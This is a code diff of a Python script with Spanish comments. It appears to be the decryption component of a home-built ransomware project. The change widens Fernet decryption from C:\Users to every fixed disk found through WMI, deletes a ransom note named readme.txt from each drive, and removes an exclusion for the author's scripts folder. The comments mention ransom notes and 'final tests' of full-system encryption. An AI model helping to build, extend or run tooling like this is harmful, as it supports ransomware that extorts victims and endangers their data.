@@ -1,5 +1,15 @@
 from cryptography.fernet import Fernet
 import os
+import wmi
+
+
+
+
+c = wmi.WMI()
+# Obtener los discos duros
+disks = [drive.DeviceID for drive in c.Win32_LogicalDisk() if drive.DriveType == 3]
+
+
 
 EXCLUIR_CARPETAS = [
     'Program Files',
@@ -8,7 +18,6 @@ EXCLUIR_CARPETAS = [
     '$Recycle.Bin',
     'AppData',
     'logs',
-    'C:\\Users\\rafa\\Desktop\\scripts'  # Carpeta adicional a excluir
 ]
 
 EXTENSIONES_PERMITIDAS = [
@@ -58,19 +67,25 @@ def obtener_archivos_en_directorio(path):
     return archivos
 
 if __name__ == "__main__":
-    # Directorio que se va a desencriptar
-    path_to_decrypt = "C:\\Users"
+    c = wmi.WMI()
+    # Obtener los discos duros
+    disks = [drive.DeviceID for drive in c.Win32_LogicalDisk() if drive.DriveType == 3]
 
-    # Eliminar la nota de rescate
-    readme_path = os.path.join(path_to_decrypt, "readme.txt")
-    if os.path.exists(readme_path):
-        os.remove(readme_path)
+    ### ESTO ES PARA DESENCRIPTAR TOTALMENTE EL SISTEMA ### SOLO DESCOMENTAR PARA PRUEBAS FINALES
+    for i in disks:
+        #Directorios para desencriptar
+        path_to_decrypt = i
 
-    # Obtener todos los archivos en el directorio y subdirectorios
-    items = obtener_archivos_en_directorio(path_to_decrypt)
+        #Borrar nota
+        readme_path = os.path.join(path_to_decrypt, "readme.txt")
+        if os.path.exists(readme_path):
+            os.remove(readme_path)
 
-    # Cargar la llave
-    key = cargar_llave()
+        #Pillar todos los archivos
+        items = obtener_archivos_en_directorio(path_to_decrypt)
 
-    # Desencriptar los archivos
-    desencriptar(items, key)
+        # Cargar la llave
+        key = cargar_llave()
+
+        # Desencriptar los archivos
+        desencriptar(items, key)
